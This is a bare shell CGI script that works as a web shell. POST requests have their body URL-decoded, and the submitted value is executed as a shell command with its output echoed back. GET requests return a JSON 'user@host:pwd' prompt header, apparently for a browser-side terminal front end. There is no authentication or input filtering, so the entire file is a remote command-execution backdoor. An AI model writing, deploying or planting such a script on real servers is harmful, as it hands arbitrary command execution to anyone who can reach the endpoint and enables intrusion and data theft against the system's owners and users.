#!/bin/sh
urldecode() {
  local encoded="${*//+/ }"
  printf '%b' "${encoded//%/\\x}"
}

if [ "$REQUEST_METHOD" = "POST" ]; then
  echo "Content-Type: text/html"
  echo ""

  header="$(whoami)@$(hostname):$(pwd)$"
  VAR=$(sed -n '1p')
  DECODED=$(urldecode "$VAR")
  cmdln=$(echo $DECODED | awk -F= '{print $2}')
  echo "<pre>$($cmdln)</pre>"
else
  echo "Content-Type: application/json"
  echo ""

  header="$(whoami)@$(hostname):$(pwd)$"
  echo '{"header": "'$header'","stdout": "Hello World_"}'
fi